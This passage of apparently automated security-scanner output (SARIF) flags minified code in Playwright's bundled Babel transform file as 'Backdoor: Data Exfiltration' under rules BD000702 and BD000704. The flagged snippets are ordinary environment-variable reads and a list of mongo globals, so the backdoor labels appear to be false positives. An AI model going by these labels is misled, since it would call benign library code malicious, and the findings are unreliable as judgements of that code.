                      "text": "fined\"?s.envName:typeof n==\"function\"?(0,ew.assertSimpleType)(n(s.envName)):(Array.isArray(n)?n:[n]).some(i=>{if(typeof i!=\"string\")throw new Error(\"Unexpected non-string value\");return i===s.envName})),r=n=>e.using(s=>(0,ew.assertSimpleType)(n(s.caller)));return{version:Hc.version,cache:e.simple(),env:t,async:()=>!1,caller:r,assertVersion:whe}}function nw(e,t){let r=()=>JSON.parse(e.using(s=>JSON.stringify(s.targets))),n=s=>{t.push(s)};return Object.assign({},rw(e),{targets:r,addExternalDependency:n})}function Che(e,t){let r=n=>e.using(s=>s.assumptions[n]);return Object.assign({},nw(e,t),{assumption:r})}function whe(e){if(typeof e==\"number\"){",
                      "markdown": "`fined\"?s.envName:typeof n==\"function\"?(0,ew.assertSimpleType)(n(s.envName)):(Array.isArray(n)?n:[n]).some(i=>{if(typeof i!=\"string\")throw new Error(\"Unexpected non-string value\");return i===s.envName})),r=n=>e.using(s=>(0,ew.assertSimpleType)(n(s.caller)));return{version:Hc.version,cache:e.simple(),env:t,async:()=>!1,caller:r,assertVersion:whe}}function nw(e,t){let r=()=>JSON.parse(e.using(s=>JSON.stringify(s.targets))),n=s=>{t.push(s)};return Object.assign({},rw(e),{targets:r,addExternalDependency:n})}function Che(e,t){let r=n=>e.using(s=>s.assumptions[n]);return Object.assign({},nw(e,t),{assumption:r})}function whe(e){if(typeof e==\"number\"){`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 397,
                  "endLine": 1723,
                  "endColumn": 420,
                  "snippet": {
                    "text": "fy:Phe};Q2.exports=Ahe});var Ag=E(zo=>{\"use strict\";Object.defineProperty(zo,\"__esModule\",{value:!0});zo.makeConfigAPI=rw;zo.makePluginAPI=Che;zo.makePresetAPI=nw;function tw(){let e=qn();return tw=function(){return e},e}var Hc=Et(),ew=pi();function rw(e){let t=n=>e.using(s=>typeof n==\"undefined\"?s.envName:typeof n==\"function\"?(0,ew.assertSimpleType)(n(s.envName)):(Array.isArray(n)?n:[n]).some(i=>{if(typeof i!=\"string\")throw new Error(\"Unexpected non-string value\");return i===s.envName})),r=n=>e.using(s=>(0,ew.assertSimpleType)(n(s.caller)));return{version:Hc.version,cache:e.simple(),env:t,async:()=>!1,caller:r,asse",
                    "rendered": {
                      "text": "fy:Phe};Q2.exports=Ahe});var Ag=E(zo=>{\"use strict\";Object.defineProperty(zo,\"__esModule\",{value:!0});zo.makeConfigAPI=rw;zo.makePluginAPI=Che;zo.makePresetAPI=nw;function tw(){let e=qn();return tw=function(){return e},e}var Hc=Et(),ew=pi();function rw(e){let t=n=>e.using(s=>typeof n==\"undefined\"?s.envName:typeof n==\"function\"?(0,ew.assertSimpleType)(n(s.envName)):(Array.isArray(n)?n:[n]).some(i=>{if(typeof i!=\"string\")throw new Error(\"Unexpected non-string value\");return i===s.envName})),r=n=>e.using(s=>(0,ew.assertSimpleType)(n(s.caller)));return{version:Hc.version,cache:e.simple(),env:t,async:()=>!1,caller:r,asse",
                      "markdown": "`fy:Phe};Q2.exports=Ahe});var Ag=E(zo=>{\"use strict\";Object.defineProperty(zo,\"__esModule\",{value:!0});zo.makeConfigAPI=rw;zo.makePluginAPI=Che;zo.makePresetAPI=nw;function tw(){let e=qn();return tw=function(){return e},e}var Hc=Et(),ew=pi();function rw(e){let t=n=>e.using(s=>typeof n==\"undefined\"?s.envName:typeof n==\"function\"?(0,ew.assertSimpleType)(n(s.envName)):(Array.isArray(n)?n:[n]).some(i=>{if(typeof i!=\"string\")throw new Error(\"Unexpected non-string value\");return i===s.envName})),r=n=>e.using(s=>(0,ew.assertSimpleType)(n(s.caller)));return{version:Hc.version,cache:e.simple(),env:t,async:()=>!1,caller:r,asse`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 1780,
                  "endLine": 1695,
                  "endColumn": 1803,
                  "snippet": {
                    "text": "fiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=ke.re=[],yt=ke.safeRe=[],H=ke.src=[],U=ke.tokens={},n2=0;function Ye(e){U[e]",
                    "rendered": {
                      "text": "fiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=ke.re=[],yt=ke.safeRe=[],H=ke.src=[],U=ke.tokens={},n2=0;function Ye(e){U[e]",
                      "markdown": "`fiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=ke.re=[],yt=ke.safeRe=[],H=ke.src=[],U=ke.tokens={},n2=0;function Ye(e){U[e]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 3159,
                  "endLine": 66,
                  "endColumn": 3201,
                  "snippet": {
                    "text": "ode[i]:a.node,i,s),this.node}ai.arrowFunctionToShadowed=function(){this.isArrowFunctionExpression()&&this.arrowFunctionToExpression()};function Yoe(){if(!this.isArrowFunctionExpression()&&!this.isFunctionExpression()&&!this.isFunctionDeclaration())throw this.buildCodeFrameError(\"Can only unwrap the environment of a function.\");KA(this)}function Xoe(e,t){e.node.type=t}function Joe({allowInsertArrow:e=!0,allowInsertArrowWithRest:t=e,noNewArrows:r=!(n=>(n=arguments[0])==null?void 0:n.specCompliant)()}={}){if(!this.isArrowFunctionExpression())throw this.buildCodeFrameError(\"Cannot convert non-arrow function to a function expression.\");let",
                    "rendered": {
                      "text": "ode[i]:a.node,i,s),this.node}ai.arrowFunctionToShadowed=function(){this.isArrowFunctionExpression()&&this.arrowFunctionToExpression()};function Yoe(){if(!this.isArrowFunctionExpression()&&!this.isFunctionExpression()&&!this.isFunctionDeclaration())throw this.buildCodeFrameError(\"Can only unwrap the environment of a function.\");KA(this)}function Xoe(e,t){e.node.type=t}function Joe({allowInsertArrow:e=!0,allowInsertArrowWithRest:t=e,noNewArrows:r=!(n=>(n=arguments[0])==null?void 0:n.specCompliant)()}={}){if(!this.isArrowFunctionExpression())throw this.buildCodeFrameError(\"Cannot convert non-arrow function to a function expression.\");let",
                      "markdown": "`ode[i]:a.node,i,s),this.node}ai.arrowFunctionToShadowed=function(){this.isArrowFunctionExpression()&&this.arrowFunctionToExpression()};function Yoe(){if(!this.isArrowFunctionExpression()&&!this.isFunctionExpression()&&!this.isFunctionDeclaration())throw this.buildCodeFrameError(\"Can only unwrap the environment of a function.\");KA(this)}function Xoe(e,t){e.node.type=t}function Joe({allowInsertArrow:e=!0,allowInsertArrowWithRest:t=e,noNewArrows:r=!(n=>(n=arguments[0])==null?void 0:n.specCompliant)()}={}){if(!this.isArrowFunctionExpression())throw this.buildCodeFrameError(\"Cannot convert non-arrow function to a function expression.\");let`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 14184,
                  "endLine": 18,
                  "endColumn": 14205,
                  "snippet": {
                    "text": ":e[6]?(t.type=\"comment\",t.closed=!!e[7]):e[8]?t.type=\"regex\":e[9]?t.type=\"number\":e[10]?t.type=\"name\":e[11]?t.type=\"punctuator\":e[12]&&(t.type=\"whitespace\"),t}});var Jm=E((t2e,Xm)=>{var Sne=require(\"tty\"),xne=!(\"NO_COLOR\"in process.env||process.argv.includes(\"--no-color\"))&&(\"FORCE_COLOR\"in process.env||process.argv.includes(\"--color\")||process.platform===\"win32\"||Sne.isatty(1)&&process.env.TERM!==\"dumb\"||\"CI\"in process.env),Dt=(e,t,r=e)=>n=>{let s=\"\"+n,i=s.indexOf(t,e.length);return~i?e+Yx(s,t,r,i)+t:e+s+t},Yx=(e,t,r,n)=>{let s=e.substring(0,n)+r,i=e.substring(n+t.length),a=i.indexOf(t);return~a?s+Yx(i,t,r,a):s+i",
                    "rendered": {
                      "text": ":e[6]?(t.type=\"comment\",t.closed=!!e[7]):e[8]?t.type=\"regex\":e[9]?t.type=\"number\":e[10]?t.type=\"name\":e[11]?t.type=\"punctuator\":e[12]&&(t.type=\"whitespace\"),t}});var Jm=E((t2e,Xm)=>{var Sne=require(\"tty\"),xne=!(\"NO_COLOR\"in process.env||process.argv.includes(\"--no-color\"))&&(\"FORCE_COLOR\"in process.env||process.argv.includes(\"--color\")||process.platform===\"win32\"||Sne.isatty(1)&&process.env.TERM!==\"dumb\"||\"CI\"in process.env),Dt=(e,t,r=e)=>n=>{let s=\"\"+n,i=s.indexOf(t,e.length);return~i?e+Yx(s,t,r,i)+t:e+s+t},Yx=(e,t,r,n)=>{let s=e.substring(0,n)+r,i=e.substring(n+t.length),a=i.indexOf(t);return~a?s+Yx(i,t,r,a):s+i",
                      "markdown": "`:e[6]?(t.type=\"comment\",t.closed=!!e[7]):e[8]?t.type=\"regex\":e[9]?t.type=\"number\":e[10]?t.type=\"name\":e[11]?t.type=\"punctuator\":e[12]&&(t.type=\"whitespace\"),t}});var Jm=E((t2e,Xm)=>{var Sne=require(\"tty\"),xne=!(\"NO_COLOR\"in process.env||process.argv.includes(\"--no-color\"))&&(\"FORCE_COLOR\"in process.env||process.argv.includes(\"--color\")||process.platform===\"win32\"||Sne.isatty(1)&&process.env.TERM!==\"dumb\"||\"CI\"in process.env),Dt=(e,t,r=e)=>n=>{let s=\"\"+n,i=s.indexOf(t,e.length);return~i?e+Yx(s,t,r,i)+t:e+s+t},Yx=(e,t,r,n)=>{let s=e.substring(0,n)+r,i=e.substring(n+t.length),a=i.indexOf(t);return~a?s+Yx(i,t,r,a):s+i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 14116,
                  "endLine": 18,
                  "endColumn": 14137,
                  "snippet": {
                    "text": "e[1]?(t.type=\"string\",t.closed=!!(e[3]||e[4])):e[5]?t.type=\"comment\":e[6]?(t.type=\"comment\",t.closed=!!e[7]):e[8]?t.type=\"regex\":e[9]?t.type=\"number\":e[10]?t.type=\"name\":e[11]?t.type=\"punctuator\":e[12]&&(t.type=\"whitespace\"),t}});var Jm=E((t2e,Xm)=>{var Sne=require(\"tty\"),xne=!(\"NO_COLOR\"in process.env||process.argv.includes(\"--no-color\"))&&(\"FORCE_COLOR\"in process.env||process.argv.includes(\"--color\")||process.platform===\"win32\"||Sne.isatty(1)&&process.env.TERM!==\"dumb\"||\"CI\"in process.env),Dt=(e,t,r=e)=>n=>{let s=\"\"+n,i=s.indexOf(t,e.length);return~i?e+Yx(s,t,r,i)+t:e+s+t},Yx=(e,t,r,n)=>{let s=e.substring(0,n)+r",
                    "rendered": {
                      "text": "e[1]?(t.type=\"string\",t.closed=!!(e[3]||e[4])):e[5]?t.type=\"comment\":e[6]?(t.type=\"comment\",t.closed=!!e[7]):e[8]?t.type=\"regex\":e[9]?t.type=\"number\":e[10]?t.type=\"name\":e[11]?t.type=\"punctuator\":e[12]&&(t.type=\"whitespace\"),t}});var Jm=E((t2e,Xm)=>{var Sne=require(\"tty\"),xne=!(\"NO_COLOR\"in process.env||process.argv.includes(\"--no-color\"))&&(\"FORCE_COLOR\"in process.env||process.argv.includes(\"--color\")||process.platform===\"win32\"||Sne.isatty(1)&&process.env.TERM!==\"dumb\"||\"CI\"in process.env),Dt=(e,t,r=e)=>n=>{let s=\"\"+n,i=s.indexOf(t,e.length);return~i?e+Yx(s,t,r,i)+t:e+s+t},Yx=(e,t,r,n)=>{let s=e.substring(0,n)+r",
                      "markdown": "`e[1]?(t.type=\"string\",t.closed=!!(e[3]||e[4])):e[5]?t.type=\"comment\":e[6]?(t.type=\"comment\",t.closed=!!e[7]):e[8]?t.type=\"regex\":e[9]?t.type=\"number\":e[10]?t.type=\"name\":e[11]?t.type=\"punctuator\":e[12]&&(t.type=\"whitespace\"),t}});var Jm=E((t2e,Xm)=>{var Sne=require(\"tty\"),xne=!(\"NO_COLOR\"in process.env||process.argv.includes(\"--no-color\"))&&(\"FORCE_COLOR\"in process.env||process.argv.includes(\"--color\")||process.platform===\"win32\"||Sne.isatty(1)&&process.env.TERM!==\"dumb\"||\"CI\"in process.env),Dt=(e,t,r=e)=>n=>{let s=\"\"+n,i=s.indexOf(t,e.length);return~i?e+Yx(s,t,r,i)+t:e+s+t},Yx=(e,t,r,n)=>{let s=e.substring(0,n)+r`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 94,
                  "endLine": 11,
                  "endColumn": 108,
                  "snippet": {
                    "text": "exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.inspect(e,this.inspectOpts).split(`\n`).map(t=>t.trim()",
                    "rendered": {
                      "text": "exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.inspect(e,this.inspectOpts).split(`\n`).map(t=>t.trim()",
                      "markdown": "`exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.inspect(e,this.inspectOpts).split(`\n`).map(t=>t.trim()`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 28,
                  "endLine": 11,
                  "endColumn": 69,
                  "snippet": {
                    "text": "${t} \\x1B[0m`;e[0]=i+e[0].split(`\n`).join(`\n`+i),e.push(s+\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.inspect(e,this.",
                    "rendered": {
                      "text": "${t} \\x1B[0m`;e[0]=i+e[0].split(`\n`).join(`\n`+i),e.push(s+\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.inspect(e,this.",
                      "markdown": "`${t} \\x1B[0m`;e[0]=i+e[0].split(`\n`).join(`\n`+i),e.push(s+\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.inspect(e,this.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 162258,
                  "endLine": 8,
                  "endColumn": 162302,
                  "snippet": {
                    "text": "a-zA-Z%]/g,s=>{s!==\"%%\"&&(r++,s===\"%c\"&&(n=r))}),e.splice(n,0,t)}wr.log=console.debug||console.log||(()=>{});function UH(e){try{e?wr.storage.setItem(\"debug\",e):wr.storage.removeItem(\"debug\")}catch{}}function VH(){let e;try{e=wr.storage.getItem(\"debug\")}catch{}return!e&&typeof process!=\"undefined\"&&\"env\"in process&&(e=process.env.DEBUG),e}function $H(){try{return localStorage}catch{}}au.exports=em()(wr);var{formatters:WH}=au.exports;WH.j=function(e){try{return JSON.stringify(e)}catch(t){return\"[UnexpectedJSONParseError]: \"+t.message}}});var aS=E((mCe,iS)=>{\"use strict\";iS.exports=(e,t)=>{t=t||process.argv;let r=e.startsWith(\"-\")?\"\":e.len",
                    "rendered": {
                      "text": "a-zA-Z%]/g,s=>{s!==\"%%\"&&(r++,s===\"%c\"&&(n=r))}),e.splice(n,0,t)}wr.log=console.debug||console.log||(()=>{});function UH(e){try{e?wr.storage.setItem(\"debug\",e):wr.storage.removeItem(\"debug\")}catch{}}function VH(){let e;try{e=wr.storage.getItem(\"debug\")}catch{}return!e&&typeof process!=\"undefined\"&&\"env\"in process&&(e=process.env.DEBUG),e}function $H(){try{return localStorage}catch{}}au.exports=em()(wr);var{formatters:WH}=au.exports;WH.j=function(e){try{return JSON.stringify(e)}catch(t){return\"[UnexpectedJSONParseError]: \"+t.message}}});var aS=E((mCe,iS)=>{\"use strict\";iS.exports=(e,t)=>{t=t||process.argv;let r=e.startsWith(\"-\")?\"\":e.len",
                      "markdown": "`a-zA-Z%]/g,s=>{s!==\"%%\"&&(r++,s===\"%c\"&&(n=r))}),e.splice(n,0,t)}wr.log=console.debug||console.log||(()=>{});function UH(e){try{e?wr.storage.setItem(\"debug\",e):wr.storage.removeItem(\"debug\")}catch{}}function VH(){let e;try{e=wr.storage.getItem(\"debug\")}catch{}return!e&&typeof process!=\"undefined\"&&\"env\"in process&&(e=process.env.DEBUG),e}function $H(){try{return localStorage}catch{}}au.exports=em()(wr);var{formatters:WH}=au.exports;WH.j=function(e){try{return JSON.stringify(e)}catch(t){return\"[UnexpectedJSONParseError]: \"+t.message}}});var aS=E((mCe,iS)=>{\"use strict\";iS.exports=(e,t)=>{t=t||process.argv;let r=e.startsWith(\"-\")?\"\":e.len`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 27736,
                  "endLine": 7,
                  "endColumn": 27767,
                  "snippet": {
                    "text": "0,h.assertNodeType)(\"ImportAttribute\")))},specifiers:{default:[],validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)(function(){let e=(0,h.assertNodeType)(\"ExportSpecifier\",\"ExportDefaultSpecifier\",\"ExportNamespaceSpecifier\"),t=(0,h.assertNodeType)(\"ExportSpecifier\");return process.env.BABEL_TYPES_8_BREAKING?function(r,n,s){(r.source?e:t)(r,n,s)}:e}()))},source:{validate:(0,h.assertNodeType)(\"StringLiteral\"),optional:!0},exportKind:(0,h.validateOptional)((0,h.assertOneOf)(\"type\",\"value\"))}});Q(\"ExportSpecifier\",{visitor:[\"local\",\"exported\"],aliases:[\"ModuleSpecifier\"],fields:{local:{validate:(0,h.assertNode",
                    "rendered": {
                      "text": "0,h.assertNodeType)(\"ImportAttribute\")))},specifiers:{default:[],validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)(function(){let e=(0,h.assertNodeType)(\"ExportSpecifier\",\"ExportDefaultSpecifier\",\"ExportNamespaceSpecifier\"),t=(0,h.assertNodeType)(\"ExportSpecifier\");return process.env.BABEL_TYPES_8_BREAKING?function(r,n,s){(r.source?e:t)(r,n,s)}:e}()))},source:{validate:(0,h.assertNodeType)(\"StringLiteral\"),optional:!0},exportKind:(0,h.validateOptional)((0,h.assertOneOf)(\"type\",\"value\"))}});Q(\"ExportSpecifier\",{visitor:[\"local\",\"exported\"],aliases:[\"ModuleSpecifier\"],fields:{local:{validate:(0,h.assertNode",
                      "markdown": "`0,h.assertNodeType)(\"ImportAttribute\")))},specifiers:{default:[],validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)(function(){let e=(0,h.assertNodeType)(\"ExportSpecifier\",\"ExportDefaultSpecifier\",\"ExportNamespaceSpecifier\"),t=(0,h.assertNodeType)(\"ExportSpecifier\");return process.env.BABEL_TYPES_8_BREAKING?function(r,n,s){(r.source?e:t)(r,n,s)}:e}()))},source:{validate:(0,h.assertNodeType)(\"StringLiteral\"),optional:!0},exportKind:(0,h.validateOptional)((0,h.assertOneOf)(\"type\",\"value\"))}});Q(\"ExportSpecifier\",{visitor:[\"local\",\"exported\"],aliases:[\"ModuleSpecifier\"],fields:{local:{validate:(0,h.assertNode`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 24825,
                  "endLine": 12,
                  "endColumn": 24833,
                  "snippet": {
                    "text": ":!1,Random:!1,ReactiveDict:!1,ReactiveVar:!1,Router:!1,ServiceConfiguration:!1,Session:!1,share:!1,Spacebars:!1,Template:!1,Tinytest:!1,Tracker:!1,UI:!1,Utils:!1,WebApp:!1,WebAppInternals:!1},mongo:{_isWindows:!1,_rand:!1,BulkWriteResult:!1,cat:!1,cd:!1,connect:!1,db:!1,getHostName:!1,getMemInfo:!1,hostname:!1,ISODate:!1,listFiles:!1,load:!1,ls:!1,md5sumFile:!1,mkdir:!1,Mongo:!1,NumberInt:!1,NumberLong:!1,ObjectId:!1,PlanCache:!1,print:!1,printjson:!1,pwd:!1,quit:!1,removeFile:!1,rs:!1,sh:!1,UUID:!1,version:!1,WriteResult:!1},applescript:{$:!1,Application:!1,Automation:!1,console:!1,delay:!1,Library:!",
                    "rendered": {
                      "text": ":!1,Random:!1,ReactiveDict:!1,ReactiveVar:!1,Router:!1,ServiceConfiguration:!1,Session:!1,share:!1,Spacebars:!1,Template:!1,Tinytest:!1,Tracker:!1,UI:!1,Utils:!1,WebApp:!1,WebAppInternals:!1},mongo:{_isWindows:!1,_rand:!1,BulkWriteResult:!1,cat:!1,cd:!1,connect:!1,db:!1,getHostName:!1,getMemInfo:!1,hostname:!1,ISODate:!1,listFiles:!1,load:!1,ls:!1,md5sumFile:!1,mkdir:!1,Mongo:!1,NumberInt:!1,NumberLong:!1,ObjectId:!1,PlanCache:!1,print:!1,printjson:!1,pwd:!1,quit:!1,removeFile:!1,rs:!1,sh:!1,UUID:!1,version:!1,WriteResult:!1},applescript:{$:!1,Application:!1,Automation:!1,console:!1,delay:!1,Library:!",
